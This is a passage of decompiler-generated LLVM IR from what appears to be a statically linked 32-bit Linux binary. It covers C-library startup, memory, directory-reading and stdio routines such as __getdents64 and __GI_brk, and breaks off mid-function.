  uselistorder i32 32, { 106, 2, 107, 108, 109, 110, 111, 60, 84, 85, 74, 75, 105, 51, 67, 64, 113, 114, 112, 4, 3, 5, 6, 61, 7, 76, 8, 9, 10, 11, 12, 13, 52, 99, 53, 62, 69, 70, 71, 72, 73, 14, 15, 68, 16, 18, 17, 19, 20, 55, 54, 77, 21, 78, 79, 63, 80, 23, 22, 25, 24, 27, 26, 28, 29, 30, 31, 57, 56, 81, 58, 65, 59, 66, 50, 82, 83, 86, 87, 88, 0, 49, 32, 89, 1, 90, 91, 92, 93, 94, 95, 96, 98, 97, 100, 33, 34, 35, 36, 101, 37, 38, 39, 40, 102, 41, 42, 44, 43, 46, 45, 47, 48, 103, 104 }
  uselistorder label %dec_label_pc_805544a, { 1, 0 }
  uselistorder label %dec_label_pc_8055432, { 1, 0 }
  uselistorder label %dec_label_pc_80553ba, { 1, 0 }
  uselistorder label %dec_label_pc_805534f, { 1, 0 }
  uselistorder label %dec_label_pc_8055321, { 1, 0 }
  uselistorder label %dec_label_pc_80552c6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8055273, { 1, 0 }
}

define i32 @__pthread_initialize_minimal() local_unnamed_addr {
entry:
  %v3_8055462 = call i32 @__libc_setup_tls(i32 1120, i64 16)
  ret i32 %v3_8055462
}

define i32 @_dl_aux_init() local_unnamed_addr {
entry:
  %v0_805546c = load i32, i32* @eax, align 4
  %v1_805546c = add i32 %v0_805546c, 28
  %v2_805546c = inttoptr i32 %v1_805546c to i32*
  %v3_805546c = load i32, i32* %v2_805546c, align 4
  %v1_805546f = add i32 %v0_805546c, 44
  %v2_805546f = inttoptr i32 %v1_805546f to i32*
  %v3_805546f = load i32, i32* %v2_805546f, align 4
  store i32 %v3_805546c, i32* @global_var_805ae20.359, align 32
  store i32 %v3_805546f, i32* @global_var_805ae24.360, align 4
  ret i32 %v3_805546f

; uselistorder directives
  uselistorder i32* @global_var_805ae24.360, { 1, 0 }
}

define i32 @_dl_nothread_init_static_tls(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805547e = load i32, i32* @esi, align 4
  %v0_805547f = load i32, i32* @ebx, align 4
  store i32 %v0_805547f, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v0_8055484 = load i32, i32* inttoptr (i32 8 to i32*), align 8
  %v2_805548b = add i32 %arg1, 40
  %v3_805548b = inttoptr i32 %v2_805548b to i32*
  %v4_805548b = load i32, i32* %v3_805548b, align 4
  %v5_805548b = sub i32 %v0_8055484, %v4_805548b
  store i32 %v5_805548b, i32* @esi, align 4
  %v0_805548e = load i32, i32* inttoptr (i32 4 to i32*), align 4
  %v1_8055495 = add i32 %arg1, 44
  %v2_8055495 = inttoptr i32 %v1_8055495 to i32*
  %v3_8055495 = load i32, i32* %v2_8055495, align 4
  %v2_8055498 = mul i32 %v3_8055495, 8
  %v3_8055498 = add i32 %v2_8055498, %v0_805548e
  store i32 %v3_8055498, i32* %eax.global-to-local, align 4
  %v2_805549b = inttoptr i32 %v3_8055498 to i32*
  store i32 %v5_805548b, i32* %v2_805549b, align 4
  %v0_805549d = load i32, i32* %eax.global-to-local, align 4
  %v1_805549d = add i32 %v0_805549d, 4
  %v2_805549d = inttoptr i32 %v1_805549d to i8*
  store i8 1, i8* %v2_805549d, align 1
  %v0_80554a1 = load i32, i32* %edx.global-to-local, align 4
  %v1_80554a1 = add i32 %v0_80554a1, 24
  %v2_80554a1 = inttoptr i32 %v1_80554a1 to i32*
  %v3_80554a1 = load i32, i32* %v2_80554a1, align 4
  store i32 %v3_80554a1, i32* %eax.global-to-local, align 4
  %v1_80554a4 = add i32 %v0_80554a1, 28
  %v2_80554a4 = inttoptr i32 %v1_80554a4 to i32*
  %v3_80554a4 = load i32, i32* %v2_80554a4, align 4
  %v2_80554a8 = sub i32 %v3_80554a4, %v3_80554a1
  store i32 %v2_80554a8, i32* @ebx, align 4
  %v1_80554aa = add i32 %v0_80554a1, 20
  %v2_80554aa = inttoptr i32 %v1_80554aa to i32*
  %v3_80554aa = load i32, i32* %v2_80554aa, align 4
  %v0_80554ad = load i32, i32* @esi, align 4
  %v3_80554ae = load i32, i32* %stack_var_-8, align 4
  %v5_80554ae = call i32 @__GI_mempcpy(i32 %v0_80554ad, i32 %v3_80554aa, i32 %v3_80554a1, i32 %v3_80554ae, i32 %v0_805547e)
  store i32 %v5_80554ae, i32* %eax.global-to-local, align 4
  %v0_80554b3 = load i32, i32* @ebx, align 4
  %v3_80554b7 = inttoptr i32 %v5_80554ae to i8*
  %v4_80554b7 = call i32 @__GI_memset(i8* %v3_80554b7, i32 0, i32 %v0_80554b3)
  store i32 %v4_80554b7, i32* %eax.global-to-local, align 4
  ret i32 %v4_80554b7

; uselistorder directives
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 0, 6, 7, 5, 1, 2, 3, 4 }
  uselistorder i32 24, { 75, 100, 101, 102, 103, 104, 105, 106, 107, 18, 109, 110, 76, 87, 88, 77, 78, 17, 113, 98, 53, 111, 112, 108, 89, 8, 90, 9, 91, 16, 19, 61, 0, 62, 79, 80, 20, 64, 54, 55, 56, 57, 58, 59, 60, 63, 65, 21, 66, 22, 67, 68, 23, 69, 70, 71, 24, 72, 26, 73, 25, 74, 81, 82, 83, 84, 85, 86, 1, 27, 28, 2, 29, 30, 3, 31, 33, 34, 32, 10, 92, 36, 37, 35, 38, 11, 40, 41, 39, 42, 12, 44, 4, 43, 45, 47, 93, 48, 46, 94, 95, 13, 50, 96, 49, 97, 14, 51, 6, 5, 7, 52, 99, 15 }
  uselistorder i8 1, { 14, 21, 22, 1, 23, 2, 3, 4, 5, 6, 10, 11, 15, 9, 0, 8, 16, 17, 18, 19, 7, 20, 13, 12 }
  uselistorder i32 44, { 5, 19, 20, 8, 9, 6, 7, 4, 24, 25, 26, 21, 22, 23, 0, 1, 10, 11, 12, 13, 14, 15, 2, 16, 17, 18, 3 }
  uselistorder i32 40, { 9, 31, 8, 3, 4, 10, 0, 11, 12, 13, 5, 1, 14, 6, 15, 16, 17, 18, 19, 2, 20, 21, 22, 23, 24, 25, 7, 26, 27, 28, 29, 30 }
  uselistorder i32* inttoptr (i32 8 to i32*), { 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 1 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @__GI_brk(i32* %arg1) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %tmp1 = ptrtoint i32* %arg1 to i32
  store i32 0, i32* %ecx.global-to-local, align 4
  %v2_80554d2 = call i32 @brk(i32* %arg1)
  store i32 %v2_80554d2, i32* @global_var_805a854.335, align 4
  %v7_80554da = icmp ult i32 %v2_80554d2, %tmp1
  %v1_80554dc = icmp eq i1 %v7_80554da, false
  br i1 %v1_80554dc, label %dec_label_pc_80554ed, label %dec_label_pc_80554de

dec_label_pc_80554de:                             ; preds = %entry
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 12, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_80554ed

dec_label_pc_80554ed:                             ; preds = %entry, %dec_label_pc_80554de
  %v0_80554ed = load i32, i32* %ecx.global-to-local, align 4
  ret i32 %v0_80554ed

; uselistorder directives
  uselistorder i32* %ecx.global-to-local, { 1, 0, 2 }
  uselistorder i32* @global_var_805a854.335, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80554ed, { 1, 0 }
}

define i32 @__getdents64(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp28 = ptrtoint i32* %arg2 to i32
  %stack_var_-40 = alloca i32, align 4
  %v0_80554f3 = load i32, i32* @edi, align 4
  %v0_80554f4 = load i32, i32* @esi, align 4
  %v0_80554f5 = load i32, i32* @ebx, align 4
  %v15_80554f6 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg3, i32* %edi.global-to-local, align 4
  store i32 %arg3, i32* %edx.global-to-local, align 4
  %v1_80554fe = add i32 %arg3, 18
  %v1_8055501 = and i32 %v1_80554fe, -4
  %v2_8055504 = sub i32 %v15_80554f6, %v1_8055501
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_8055509 = add i32 %v2_8055504, 15
  %v1_805550d = and i32 %v1_8055509, -16
  %v8_805550d = inttoptr i32 %v1_805550d to %linux_dirent64*
  store i32 %v1_805550d, i32* %ecx.global-to-local, align 4
  %v2_8055510 = add i32 %v2_8055504, -4
  %v3_8055510 = inttoptr i32 %v2_8055510 to i32*
  store i32 %v0_80554f5, i32* %v3_8055510, align 4
  %v0_8055511 = load i32, i32* %eax.global-to-local, align 4
  store i32 220, i32* %eax.global-to-local, align 4
  %v5_8055518 = call i32 @getdents64(i32 %v0_8055511, %linux_dirent64* %v8_805550d, i32 %arg3)
  store i32 %v5_8055518, i32* %eax.global-to-local, align 4
  %v0_805551a = load i32, i32* @esp, align 4
  store i32 %v5_8055518, i32* %stack_var_-40, align 4
  %tmp47 = icmp ult i32 %v5_8055518, -4095
  br i1 %tmp47, label %dec_label_pc_8055537, label %dec_label_pc_8055525

dec_label_pc_8055525:                             ; preds = %entry
  %v1_8055525 = sub i32 0, %v5_8055518
  store i32 %v1_8055525, i32* %stack_var_-40, align 4
  store i32 -8, i32* %eax.global-to-local, align 4
  store i32 %v1_8055525, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80555a4

dec_label_pc_8055537:                             ; preds = %entry
  %v3_805551a = add i32 %v0_805551a, 4
  store i32 %tmp28, i32* @esi, align 4
  %v3_805554a = add i32 %v5_8055518, %v1_805550d
  store i32 %v3_805554a, i32* %eax.global-to-local, align 4
  %v0_805554c = load i32, i32* %edi.global-to-local, align 4
  %v2_805554c = add i32 %v0_805554c, %tmp28
  store i32 %v2_805554c, i32* %edi.global-to-local, align 4
  store i32 %v1_805550d, i32* @ebx, align 4
  %v10_80555f25 = icmp ult i32 %v1_805550d, %v3_805554a
  br i1 %v10_80555f25, label %dec_label_pc_8055569, label %dec_label_pc_80555fb

dec_label_pc_8055569:                             ; preds = %dec_label_pc_8055537, %dec_label_pc_80555a9
  %v0_8055580 = phi i32 [ %v1_80555ef, %dec_label_pc_80555a9 ], [ %v3_805551a, %dec_label_pc_8055537 ]
  %v1_80555ba = phi i32 [ %v2_8055576, %dec_label_pc_80555a9 ], [ %tmp28, %dec_label_pc_8055537 ]
  %v0_80555b5 = phi i32 [ %v2_80555ed, %dec_label_pc_80555a9 ], [ %v1_805550d, %dec_label_pc_8055537 ]
  %stack_var_-24.013 = phi i32 [ %v3_80555a9, %dec_label_pc_80555a9 ], [ -1, %dec_label_pc_8055537 ]
  %stack_var_-20.012 = phi i32 [ %v3_80555ac, %dec_label_pc_80555a9 ], [ -1, %dec_label_pc_8055537 ]
  %v1_8055569 = add i32 %v0_80555b5, 16
  %v2_8055569 = inttoptr i32 %v1_8055569 to i16*
  %v3_8055569 = load i16, i16* %v2_8055569, align 2
  %v4_8055569 = zext i16 %v3_8055569 to i32
  store i32 %v4_8055569, i32* @edi, align 4
  store i32 %v2_805554c, i32* %eax.global-to-local, align 4
  %v1_8055570 = add nuw nsw i32 %v4_8055569, 3
  %v1_8055573 = and i32 %v1_8055570, 131068
  store i32 %v1_8055573, i32* %ecx.global-to-local, align 4
  %v2_8055576 = add i32 %v1_8055573, %v1_80555ba
  store i32 %v2_8055576, i32* %edx.global-to-local, align 4
  %tmp48 = icmp ugt i32 %v2_8055576, %v2_805554c
  br i1 %tmp48, label %dec_label_pc_8055580, label %dec_label_pc_80555a9

dec_label_pc_8055580:                             ; preds = %dec_label_pc_8055569
  %v1_8055580 = add i32 %v0_8055580, -4
  %v2_8055580 = inttoptr i32 %v1_8055580 to i32*
  store i32 0, i32* %v2_8055580, align 4
  %v5_8055582 = add i32 %v0_8055580, -8
  %v6_8055582 = inttoptr i32 %v5_8055582 to i32*
  store i32 %stack_var_-20.012, i32* %v6_8055582, align 4
  %v5_8055585 = add i32 %v0_8055580, -12
  %v6_8055585 = inttoptr i32 %v5_8055585 to i32*
  store i32 %stack_var_-24.013, i32* %v6_8055585, align 4
  %v5_8055588 = add i32 %v0_8055580, -16
  %v6_8055588 = inttoptr i32 %v5_8055588 to i32*
  store i32 %arg1, i32* %v6_8055588, align 4
  %v1_805558b = call i32 @__GI_lseek64(i32 %v2_8055576)
  store i32 %v1_805558b, i32* %eax.global-to-local, align 4
  %v0_8055593 = load i32, i32* @esi, align 4
  %v15_8055593 = icmp eq i32 %v0_8055593, %tmp28
  %v1_8055596 = icmp eq i1 %v15_8055593, false
  br i1 %v1_8055596, label %dec_label_pc_80555fb, label %dec_label_pc_8055598

dec_label_pc_8055598:                             ; preds = %dec_label_pc_8055580
  store i32 -8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80555a4

dec_label_pc_80555a4:                             ; preds = %dec_label_pc_8055525, %dec_label_pc_8055598
  %storemerge = phi i32 [ 22, %dec_label_pc_8055598 ], [ %v1_8055525, %dec_label_pc_8055525 ]
  store i32 %storemerge, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_8055600

dec_label_pc_80555a9:                             ; preds = %dec_label_pc_8055569
  %v1_80555a9 = add i32 %v0_80555b5, 8
  %v2_80555a9 = inttoptr i32 %v1_80555a9 to i32*
  %v3_80555a9 = load i32, i32* %v2_80555a9, align 4
  store i32 %v3_80555a9, i32* %eax.global-to-local, align 4
  %v1_80555ac = add i32 %v0_80555b5, 12
  %v2_80555ac = inttoptr i32 %v1_80555ac to i32*
  %v3_80555ac = load i32, i32* %v2_80555ac, align 4
  store i32 %v3_80555ac, i32* %edx.global-to-local, align 4
  %v1_80555b5 = inttoptr i32 %v0_80555b5 to i32*
  %v2_80555b5 = load i32, i32* %v1_80555b5, align 4
  store i32 %v2_80555b5, i32* %eax.global-to-local, align 4
  %v1_80555b7 = add i32 %v0_80555b5, 4
  %v2_80555b7 = inttoptr i32 %v1_80555b7 to i32*
  %v3_80555b7 = load i32, i32* %v2_80555b7, align 4
  %v2_80555ba = add i32 %v1_80555ba, 4
  %v3_80555ba = inttoptr i32 %v2_80555ba to i32*
  store i32 %v3_80555b7, i32* %v3_80555ba, align 4
  %v0_80555bd = load i32, i32* %eax.global-to-local, align 4
  %v1_80555bd = load i32, i32* @esi, align 4
  %v2_80555bd = inttoptr i32 %v1_80555bd to i32*
  store i32 %v0_80555bd, i32* %v2_80555bd, align 4
  store i32 %v3_80555ac, i32* %edx.global-to-local, align 4
  store i32 %v3_80555a9, i32* %eax.global-to-local, align 4
  %v1_80555c5 = load i32, i32* @esi, align 4
  %v2_80555c5 = add i32 %v1_80555c5, 8
  %v3_80555c5 = inttoptr i32 %v2_80555c5 to i32*
  store i32 %v3_80555a9, i32* %v3_80555c5, align 4
  %v0_80555c8 = load i32, i32* %edx.global-to-local, align 4
  %v1_80555c8 = load i32, i32* @esi, align 4
  %v2_80555c8 = add i32 %v1_80555c8, 12
  %v3_80555c8 = inttoptr i32 %v2_80555c8 to i32*
  store i32 %v0_80555c8, i32* %v3_80555c8, align 4
  %v0_80555cb = load i32, i32* %ecx.global-to-local, align 4
  %v1_80555cb = trunc i32 %v0_80555cb to i16
  %v2_80555cb = load i32, i32* @esi, align 4
  %v3_80555cb = add i32 %v2_80555cb, 16
  %v4_80555cb = inttoptr i32 %v3_80555cb to i16*
  store i16 %v1_80555cb, i16* %v4_80555cb, align 2
  %v0_80555cf = load i32, i32* @ebx, align 4
  %v1_80555cf = add i32 %v0_80555cf, 18
  %v2_80555cf = inttoptr i32 %v1_80555cf to i8*
  %v3_80555cf = load i8, i8* %v2_80555cf, align 1
  %v2_80555d2 = load i32, i32* @esi, align 4
  %v3_80555d2 = add i32 %v2_80555d2, 18
  %v4_80555d2 = inttoptr i32 %v3_80555d2 to i8*
  store i8 %v3_80555cf, i8* %v4_80555d2, align 1
  %v0_80555d5 = load i32, i32* @edi, align 4
  %v1_80555d5 = add i32 %v0_80555d5, -19
  %v1_80555d8 = load i32, i32* @esp, align 4
  %v2_80555d8 = add i32 %v1_80555d8, -4
  %v3_80555d8 = inttoptr i32 %v2_80555d8 to i32*
  store i32 %v1_80555d5, i32* %v3_80555d8, align 4
  %v0_80555d9 = load i32, i32* @ebx, align 4
  %v1_80555d9 = add i32 %v0_80555d9, 19
  %v2_80555dc = add i32 %v1_80555d8, -8
  %v3_80555dc = inttoptr i32 %v2_80555dc to i32*
  store i32 %v1_80555d9, i32* %v3_80555dc, align 4
  %v0_80555dd = load i32, i32* @esi, align 4
  %v1_80555dd = add i32 %v0_80555dd, 19
  store i32 %v1_80555dd, i32* %eax.global-to-local, align 4
  %v2_80555e0 = add i32 %v1_80555d8, -12
  %v3_80555e0 = inttoptr i32 %v2_80555e0 to i32*
  store i32 %v1_80555dd, i32* %v3_80555e0, align 4
  %v3_80555e1 = inttoptr i32 %v2_8055576 to i8*
  %v4_80555e1 = call i32 @memcpy(i8* %v3_80555e1, i32 %v3_80555a9, i32 %v3_80555ac)
  store i32 %v4_80555e1, i32* %eax.global-to-local, align 4
  %v0_80555e6 = load i32, i32* @ebx, align 4
  %v1_80555e6 = add i32 %v0_80555e6, 16
  %v2_80555e6 = inttoptr i32 %v1_80555e6 to i16*
  %v3_80555e6 = load i16, i16* %v2_80555e6, align 2
  %v4_80555e6 = zext i16 %v3_80555e6 to i32
  store i32 %v4_80555e6, i32* %eax.global-to-local, align 4
  store i32 %v2_8055576, i32* @esi, align 4
  %v2_80555ed = add i32 %v4_80555e6, %v0_80555e6
  store i32 %v2_80555ed, i32* @ebx, align 4
  %v0_80555ef = load i32, i32* @esp, align 4
  %v1_80555ef = add i32 %v0_80555ef, 12
  %v10_80555f2 = icmp ult i32 %v2_80555ed, %v3_805554a
  br i1 %v10_80555f2, label %dec_label_pc_8055569, label %dec_label_pc_80555fb

dec_label_pc_80555fb:                             ; preds = %dec_label_pc_80555a9, %dec_label_pc_8055537, %dec_label_pc_8055580
  %v0_80555fb = phi i32 [ %v0_8055593, %dec_label_pc_8055580 ], [ %tmp28, %dec_label_pc_8055537 ], [ %v2_8055576, %dec_label_pc_80555a9 ]
  %v5_80555fd = sub i32 %v0_80555fb, %tmp28
  br label %dec_label_pc_8055600

dec_label_pc_8055600:                             ; preds = %dec_label_pc_80555a4, %dec_label_pc_80555fb
  %storemerge37 = phi i32 [ %v5_80555fd, %dec_label_pc_80555fb ], [ -1, %dec_label_pc_80555a4 ]
  store i32 %storemerge37, i32* %eax.global-to-local, align 4
  store i32 %v0_80554f4, i32* @esi, align 4
  store i32 %v0_80554f3, i32* @edi, align 4
  ret i32 %storemerge37

; uselistorder directives
  uselistorder i32 %v2_80555ed, { 1, 2, 0 }
  uselistorder i32 %v3_80555ac, { 1, 2, 3, 0 }
  uselistorder i32 %v3_80555a9, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v0_8055593, { 1, 0 }
  uselistorder i32 %v2_8055576, { 0, 4, 5, 1, 2, 6, 3 }
  uselistorder i32 %v0_80555b5, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_80555ba, { 1, 0 }
  uselistorder i32 %v0_8055580, { 3, 2, 1, 0 }
  uselistorder i32 %v5_8055518, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v1_805550d, { 0, 2, 3, 1, 5, 4 }
  uselistorder i32 %tmp28, { 5, 3, 2, 0, 1, 4 }
  uselistorder i32* %eax.global-to-local, { 16, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 0, 13, 14, 15 }
  uselistorder i32 19, { 10, 11, 9, 1, 5, 2, 6, 3, 7, 4, 8, 0 }
  uselistorder i32 22, { 1, 7, 0, 3, 8, 2, 5, 6, 4 }
  uselistorder i32 -12, { 33, 34, 35, 18, 103, 104, 39, 36, 41, 37, 19, 38, 40, 20, 42, 21, 43, 44, 45, 46, 47, 22, 23, 48, 49, 50, 24, 55, 56, 58, 54, 53, 51, 52, 57, 59, 25, 60, 61, 62, 63, 64, 65, 66, 67, 26, 68, 69, 32, 27, 30, 28, 88, 73, 74, 0, 75, 1, 2, 76, 3, 4, 96, 29, 77, 5, 78, 79, 6, 7, 80, 8, 81, 9, 10, 82, 11, 83, 12, 13, 84, 14, 85, 15, 86, 87, 91, 92, 93, 89, 90, 94, 95, 31, 105, 70, 71, 72, 97, 106, 98, 99, 100, 107, 101, 16, 102, 17 }
  uselistorder i32 3, { 77, 1, 37, 65, 88, 87, 2, 12, 13, 0, 38, 39, 31, 32, 40, 70, 71, 72, 73, 74, 75, 76, 66, 3, 78, 79, 14, 33, 41, 34, 80, 35, 81, 82, 4, 11, 15, 42, 16, 44, 43, 45, 17, 46, 18, 47, 48, 49, 19, 50, 20, 51, 21, 52, 22, 53, 23, 54, 24, 8, 9, 5, 10, 7, 55, 83, 25, 56, 26, 57, 58, 27, 59, 28, 60, 61, 62, 29, 63, 30, 84, 68, 69, 85, 67, 64, 86, 36, 6 }
  uselistorder i32* @esp, { 118, 119, 120, 651, 652, 653, 654, 655, 656, 4, 3, 657, 658, 659, 660, 661, 2, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 640, 355, 7, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 10, 122, 123, 124, 125, 126, 70, 71, 72, 73, 74, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 69, 8, 127, 75, 9, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 121, 141, 142, 5, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 6, 158, 329, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 11, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 12, 183, 184, 185, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 186, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 261, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 0, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 13, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 14, 293, 294, 15, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 16, 315, 316, 317, 319, 320, 318, 321, 322, 323, 324, 325, 326, 327, 328, 17, 330, 331, 332, 19, 333, 334, 20, 335, 21, 336, 353, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 22, 354, 18, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 40, 356, 357, 358, 359, 360, 361, 26, 362, 363, 364, 25, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 365, 366, 367, 368, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 27, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 409, 408, 1, 410, 411, 412, 413, 414, 415, 416, 417, 24, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 389, 390, 391, 392, 393, 394, 395, 29, 28, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 30, 452, 453, 454, 455, 456, 457, 458, 31, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 32, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 33, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 34, 590, 591, 592, 593, 594, 595, 35, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 36, 614, 37, 615, 616, 617, 618, 619, 620, 38, 621, 622, 623, 624, 39, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 23, 637, 638, 639, 641, 642, 643, 644, 645, 646, 647, 41, 648, 649, 650 }
  uselistorder i32 -16, { 42, 150, 173, 169, 167, 168, 40, 172, 170, 171, 41, 46, 47, 48, 43, 50, 51, 44, 45, 19, 20, 49, 21, 52, 22, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 23, 24, 25, 63, 64, 65, 66, 26, 72, 73, 74, 71, 76, 77, 70, 78, 69, 67, 68, 75, 79, 80, 27, 81, 82, 83, 84, 85, 18, 86, 28, 87, 88, 89, 90, 91, 92, 93, 94, 95, 29, 96, 97, 99, 98, 100, 147, 39, 1, 111, 30, 31, 112, 10, 37, 129, 35, 130, 0, 109, 110, 32, 113, 33, 2, 4, 115, 5, 139, 3, 34, 114, 116, 36, 117, 118, 119, 6, 120, 7, 121, 122, 8, 123, 124, 9, 125, 126, 127, 128, 151, 152, 133, 11, 134, 135, 131, 132, 12, 136, 137, 38, 153, 13, 138, 154, 155, 156, 101, 157, 102, 103, 104, 105, 106, 107, 108, 140, 141, 158, 159, 160, 142, 161, 162, 143, 163, 144, 145, 164, 166, 165, 146, 14, 148, 149, 15, 16, 17 }
  uselistorder i32 15, { 10, 11, 9, 12, 4, 5, 3, 6, 7, 8, 0, 1, 2 }
  uselistorder i32 18, { 7, 8, 9, 6, 5, 3, 4, 10, 11, 0, 12, 1, 2 }
  uselistorder i32* @edi, { 14, 15, 16, 17, 278, 279, 280, 281, 282, 283, 284, 285, 286, 291, 292, 2, 293, 294, 295, 296, 297, 298, 299, 300, 3, 301, 302, 303, 304, 308, 309, 310, 311, 312, 313, 314, 315, 328, 329, 330, 331, 332, 333, 334, 337, 338, 339, 186, 187, 316, 317, 318, 54, 55, 56, 57, 58, 362, 365, 366, 367, 363, 364, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 319, 320, 321, 322, 323, 324, 325, 326, 327, 305, 306, 307, 350, 351, 352, 353, 0, 354, 355, 356, 4, 357, 5, 358, 359, 360, 361, 335, 336, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 188, 189, 190, 191, 192, 287, 288, 289, 290, 12, 13, 9, 10, 11, 18, 19, 20, 21, 22, 23, 24, 25, 26, 30, 31, 27, 28, 29, 168, 169, 170, 171, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 69, 70, 71, 6, 72, 73, 74, 75, 76, 77, 78, 7, 79, 80, 82, 81, 83, 84, 89, 85, 86, 87, 88, 90, 91, 92, 93, 94, 99, 95, 96, 97, 98, 100, 101, 102, 103, 8, 104, 109, 105, 106, 107, 108, 110, 111, 112, 113, 114, 115, 116, 121, 117, 118, 119, 120, 122, 123, 124, 125, 126, 127, 128, 133, 129, 130, 131, 132, 134, 135, 136, 137, 144, 138, 139, 140, 141, 142, 143, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 161, 156, 157, 158, 159, 160, 165, 162, 163, 164, 166, 167, 172, 173, 179, 174, 175, 176, 177, 178, 183, 180, 181, 182, 184, 185, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 235, 232, 233, 234, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 255, 253, 254, 252, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 1, 269, 270, 271, 272, 273, 274, 275, 276, 277 }
  uselistorder i32 %arg3, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8055600, { 1, 0 }
  uselistorder label %dec_label_pc_80555fb, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80555a4, { 1, 0 }
  uselistorder label %dec_label_pc_8055569, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8055608 = load i32, i32* @ebx, align 4
  store i32 %v0_8055608, i32* %stack_var_-4, align 4
  store i32 0, i32* @eax, align 4
  %v4_805560b = ptrtoint i16* %arg1 to i32
  store i32 %v4_805560b, i32* %ebx.global-to-local, align 4
  %v1_8055613 = bitcast i16* %arg1 to i8*
  %v2_8055613 = load i8, i8* %v1_8055613, align 1
